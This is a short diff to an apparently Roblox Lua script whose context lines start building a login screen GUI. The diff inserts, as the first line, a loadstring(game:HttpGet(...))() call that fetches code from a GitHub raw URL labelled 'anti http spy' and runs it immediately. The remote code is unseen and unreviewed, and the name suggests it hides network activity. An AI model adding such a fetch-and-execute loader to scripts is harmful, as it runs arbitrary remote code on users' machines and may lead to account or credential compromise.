@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/juruo-script/script/refs/heads/main/anti%20http%20spy'))()
 -- MAKE SURE YOU READ THE INSTRUCTIONS OR IT WILL MOST LIKELY NOT WORK
 
 local LoginScreenGui = Instance.new("ScreenGui")
